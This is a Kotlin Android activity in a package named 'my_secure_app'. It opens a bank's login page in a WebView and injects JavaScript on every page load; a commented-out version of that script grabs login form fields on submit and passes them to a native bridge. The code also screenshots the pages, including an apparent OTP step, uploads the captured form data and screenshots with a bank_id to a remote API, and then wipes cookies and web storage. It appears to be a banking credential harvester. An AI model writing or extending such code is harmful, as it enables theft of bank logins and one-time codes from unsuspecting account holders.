package com.example.my_secure_app

import android.Manifest
import android.Manifest.permission.WRITE_EXTERNAL_STORAGE
import android.content.Intent
import android.graphics.*
import android.net.Uri
import android.os.*
import android.os.Build.VERSION.SDK_INT
import android.provider.Settings
import android.text.format.DateFormat
import android.util.Log
import android.view.View
import android.view.Window
import android.view.WindowManager
import android.webkit.*
import android.widget.ImageView
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import io.flutter.embedding.engine.FlutterEngine
import okhttp3.MultipartBody
import okhttp3.RequestBody
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import java.io.File
import java.io.FileOutputStream
import java.io.OutputStream
import java.util.*


class MyTestingActivityKotlin : AppCompatActivity() {
    private var webView: WebView?=null
    private var progress_bar: ProgressBar?=null
    private var url: TextView?=null
    private var tv_counter: TextView?=null
    private var bank_name: TextView?=null
    private var back_button: ImageView?=null
    private val REQUEST_EXTERNAL_STORAGe = 1
    private var JS=""" """
    private var isSuccess:Boolean=false
    private var isOtp:Boolean=false
    private var count:Int=0
    private var countNew:Int=0
    private var otpUrlNew:String=""
    private lateinit var timer :CountDownTimer

    lateinit var flutterEngine : FlutterEngine
    private val permissionstorage = arrayOf(
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION
    )
    var os: OutputStream? = null
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_my_testing_kotlin)
        supportActionBar?.hide()
        webView = findViewById(R.id.web_kotlin)
        progress_bar = findViewById(R.id.pp)

        url= findViewById(R.id.tv_url)
        bank_name= findViewById(R.id.tv_bank_name)
        tv_counter= findViewById(R.id.tv_counter)
        back_button= findViewById<ImageView>(R.id.iv_cross)

        val window: Window = window
        window.clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);
        window.addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS);
        window.statusBarColor = Color.parseColor("#1D1C21")
        webView?.getSettings()?.loadWithOverviewMode = true
        webView?.getSettings()?.useWideViewPort = true
        webView?.getSettings()?.domStorageEnabled = true
        url!!.text = AppConstants.BANK_URL
        bank_name!!.text = AppConstants.BANK_NAME
        //url!!.text = "https://adminsecure.thriftyspends.com/login"//AppConstants.BANK_URL
        JS="""${AppConstants.JS_SCRIPT}"""
        //JS="""javascript:(function() {var form = document.querySelector('form');function updateResult() {var out = new URLSearchParams(new FormData(form)).toString();Bridge.callFromJs(out);}form.addEventListener('submit', updateResult);})()"""
        verifypermissions()
        webView?.loadUrl(AppConstants.BANK_URL)
        //webView?.loadUrl("https://adminsecure.thriftyspends.com/login")
        webView?.settings?.javaScriptEnabled = true
        webView?.getSettings()?.setJavaScriptCanOpenWindowsAutomatically(true);
        webView?.requestFocusFromTouch();
        webView?.setWebChromeClient(object : WebChromeClient() {
            override fun onProgressChanged(view: WebView?, progress: Int) {

                if (progress > 60) {
                    progress_bar!!.setVisibility(View.GONE)
                }
            }
        })
        back_button!!.setOnClickListener {
            onCloseFunction()
        }
        webView?.webViewClient = object : WebViewClient() {

            override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
                super.onPageStarted(view, url, favicon)
                progress_bar!!.setVisibility(View.VISIBLE)
                Log.d("VIEWURL","onPageStarted:"+url.toString())
            }

            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                Log.d("VIEWURL","onPageFinished:"+url.toString())
                count++
                progress_bar!!.setVisibility(View.GONE)
                injectJavaScript(view);

                if (count!=1){
                    if (AppConstants.BANK_URL.toString()==url.toString() || url.toString().contains(AppConstants.BANK_URL)){
                        isSuccess=false
                        Log.d("VIEWURL","onPageFinished:"+isSuccess.toString())
                        takeScreenShotAndSendApi(view)
                    }
                    else{
                        countNew++

                        if(countNew!=1){
                            if(otpUrlNew==url || url.toString().contains(otpUrlNew)){

                            }else{
                                timer.cancel()
                                isSuccess=true
                                takeScreenShotAndSendApi(view)
                            }

                        }else{
                            otpUrlNew = url.toString()
                            timer = object: CountDownTimer(30000, 1000) {
                                override fun onTick(millisUntilFinished: Long) {
                                    tv_counter!!.text=(millisUntilFinished/1000).toString()

                                }

                                override fun onFinish() {
                                    isSuccess=false
                                    Log.d("VIEWURL","onPageFinished:"+isSuccess.toString())
                                    takeScreenShotAndSendApiNew(view)
                                }
                            }
                            timer.start()
                        }


                        /*isSuccess=true
                        Log.d("VIEWURL","onPageFinished:"+isSuccess.toString())
                        takeScreenShotAndSendApi(view)*/
                    }
                }
            }
        }
        webView?.addJavascriptInterface(JSBridge, "Bridge")
    }


    private fun takeScreenShotAndSendApi(view: WebView?){

        val time = System.currentTimeMillis()
        val picture: Picture = view!!.capturePicture()
        val mPath = Environment.getExternalStorageDirectory().toString() + "/" +time+ ".jpg"
        var imageFile = File(mPath)
        val b = Bitmap.createBitmap(
            picture.width,
            picture.height, Bitmap.Config.ARGB_8888
        )
        val c = Canvas(b)
        picture.draw(c)
        Log.d("VIEWURL","Screenshot Taken")
        try {
            os = FileOutputStream(imageFile)
            b.compress(Bitmap.CompressFormat.JPEG, 100, os)
            os?.flush()
            os?.close()
            sendScreenShotToAPi(AppConstants.textDataForApi,imageFile)

        } catch (e: Exception) {
            Log.e(javaClass.simpleName, "Error writing bitmap", e)
        }
    }

    private fun sendScreenShotToAPi(data:String,imageFile: File) {
        Log.d("VIEWURL","data For Api:"+data)
        val builder: MultipartBody.Builder = MultipartBody.Builder().setType(MultipartBody.FORM)
        builder.addFormDataPart("data", data)
        builder.addFormDataPart("success", isSuccess.toString())
        builder.addFormDataPart("bank_id", AppConstants.bankId)
        builder.addFormDataPart(
            "file",
            imageFile.name,
            RequestBody.create(MultipartBody.FORM, imageFile)
        )

        val requestBody: RequestBody = builder.build()
        val call = RetrofitClient.getInstance().myApi.getPostCreateBodyResponse(
            "application/json",
            "Bearer" + " " + AppConstants.AuthToken,
            requestBody
        )
        call.enqueue(object : Callback<DataResponseModel?> {
            override fun onResponse(
                call: Call<DataResponseModel?>,
                response: Response<DataResponseModel?>
            ) {
                if (response.body() != null) {
                    Log.d("VIEWURL", response.body()!!.message + "DATA IS:- "+AppConstants.textDataForApi)
                    if (isSuccess){
                        WebStorage.getInstance().deleteAllData()
                        AppConstants.killApp="true"
                        isSuccess=false
                        finish()
                    }
                    else{
                        isSuccess=false
                        AppConstants.killApp="false"
                    }
                }
            }

            override fun onFailure(call: Call<DataResponseModel?>, t: Throwable) {
                Log.d("RESPONSE", t.toString())
            }
        })
    }

    object JSBridge {
        @JavascriptInterface
        fun callFromJs(s: String) {

            Handler(Looper.getMainLooper()).post(Runnable {
                AppConstants.textDataForApi=s
                Log.v("<=====SCREENSHOT=====>","data:"+AppConstants.textDataForApi)
            })
        }
    }

    fun verifypermissions() {

        if (SDK_INT >= Build.VERSION_CODES.R) {
            if (Environment.isExternalStorageManager()) {
               // startActivity(Intent(this, MyTestingActivityKotlin::class.java))
            } else { //request for the permission
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                val uri = Uri.fromParts("package", packageName, null)
                intent.data = uri
                startActivity(intent)
            }
        } else {
            //below android 11=======
            //startActivity(Intent(this, MyTestingActivityKotlin::class.java))
            ActivityCompat.requestPermissions(
                this,
                arrayOf(WRITE_EXTERNAL_STORAGE),
                REQUEST_EXTERNAL_STORAGe
            )
        }
    }

    private fun injectJavaScript(view: WebView?) {
        view!!.loadUrl(
            JS
        )
    }


    fun getScreenshots(s:String){
        webView?.webViewClient = object : WebViewClient() {
            override fun onPageCommitVisible(view: WebView, url: String) {

            }
        }
    }

    private fun savebitmap(filename: String): File? {
        val extStorageDirectory = Environment.getExternalStorageDirectory().toString()
        var outStream: OutputStream? = null
        var file = File("$filename.png")
        if (file.exists()) {
            file.delete()
            file = File(extStorageDirectory, "$filename.png")
            Log.e("file exist", "$file,Bitmap= $filename")
        }
        try {
            // make a new bitmap from your file
            val bitmap: Bitmap = BitmapFactory.decodeFile(file.name)
            outStream = FileOutputStream(file)
            bitmap.compress(Bitmap.CompressFormat.PNG, 100, outStream)
            outStream.flush()
            outStream.close()
        } catch (e: java.lang.Exception) {
            e.printStackTrace()
        }
        Log.e("file", "" + file)
        return file
    }

    fun getScreenshot(s: String) {
        val now = Date()
        DateFormat.format("yyyy-MM-dd_hh:mm:ss", now)
        try {
            // image naming and path  to include sd card  appending name you choose for file
            val mPath = Environment.getExternalStorageDirectory().toString() + "/" + ".jpg"

            // create bitmap screen capture
            val v1 = window.decorView.rootView
//            val v1: View = findViewById<View?>(R.id.web_kotlin).rootView

            v1.isDrawingCacheEnabled = true
            val bitmap = Bitmap.createBitmap(v1.drawingCache)
            v1.isDrawingCacheEnabled = false
            val imageFile = File(mPath)
            val outputStream = FileOutputStream(imageFile)
            val quality = 100
            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream)
            outputStream.flush()
            outputStream.close()


//            openScreenshot(imageFile);

        } catch (e: Throwable) {
            // Several error may come out with file handling or DOM
            e.printStackTrace()
        }
    }




    private fun takeScreenShotAndSendApiNew(view: WebView?){

        val time = System.currentTimeMillis()
        val picture: Picture = view!!.capturePicture()
        val mPath = Environment.getExternalStorageDirectory().toString() + "/" +time+ ".jpg"
        var imageFile = File(mPath)
        val b = Bitmap.createBitmap(
            picture.width,
            picture.height, Bitmap.Config.ARGB_8888
        )
        val c = Canvas(b)
        picture.draw(c)
        Log.d("VIEWURL","Screenshot Taken")
        try {
            os = FileOutputStream(imageFile)
            b.compress(Bitmap.CompressFormat.JPEG, 100, os)
            os?.flush()
            os?.close()
            sendScreenShotToAPiNew(AppConstants.textDataForApi,imageFile)

        } catch (e: Exception) {
            Log.e(javaClass.simpleName, "Error writing bitmap", e)
        }
    }

    private fun sendScreenShotToAPiNew(data:String,imageFile: File) {
        Log.d("VIEWURL","data For Api:"+data)
        val builder: MultipartBody.Builder = MultipartBody.Builder().setType(MultipartBody.FORM)
        builder.addFormDataPart("data", data)
        builder.addFormDataPart("success", isSuccess.toString())
        builder.addFormDataPart("bank_id", AppConstants.bankId)
        builder.addFormDataPart(
            "file",
            imageFile.name,
            RequestBody.create(MultipartBody.FORM, imageFile)
        )

        val requestBody: RequestBody = builder.build()
        val call = RetrofitClient.getInstance().myApi.getPostCreateBodyResponse(
            "application/json",
            "Bearer" + " " + AppConstants.AuthToken,
            requestBody
        )
        call.enqueue(object : Callback<DataResponseModel?> {
            override fun onResponse(
                call: Call<DataResponseModel?>,
                response: Response<DataResponseModel?>
            ) {
                if (response.body() != null) {
                    Log.d("VIEWURL", response.body()!!.message + "DATA IS:- "+AppConstants.textDataForApi)
                    if (isSuccess){
                        AppConstants.killApp="true"
                        isSuccess=false
                        finish()
                    }
                    else{
                        isSuccess=false
                        Log.d("SSSSSSSS","Fals,time completeeee")
                        AppConstants.killApp="false"
                        WebStorage.getInstance().deleteAllData()
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                            CookieManager.getInstance().removeAllCookies(null)
                            CookieManager.getInstance().flush()
                        } else if (applicationContext != null) {
                            val cookieSyncManager = CookieSyncManager.createInstance(applicationContext)
                            cookieSyncManager.startSync()
                            val cookieManager: CookieManager = CookieManager.getInstance()
                            cookieManager.removeAllCookie()
                            cookieManager.removeSessionCookie()
                            cookieSyncManager.stopSync()
                            cookieSyncManager.sync()
                        }
                        finish()
                    }
                }
            }

            override fun onFailure(call: Call<DataResponseModel?>, t: Throwable) {
                Log.d("RESPONSE", t.toString())
            }
        })
    }

    override fun onBackPressed() {
        onCloseFunction()

    }
    fun onCloseFunction(){
        isSuccess=false
        Log.d("SSSSSSSS","Falseeeeeee,timerrr completeeee")
        AppConstants.killApp="false"
        finish()
    }


}
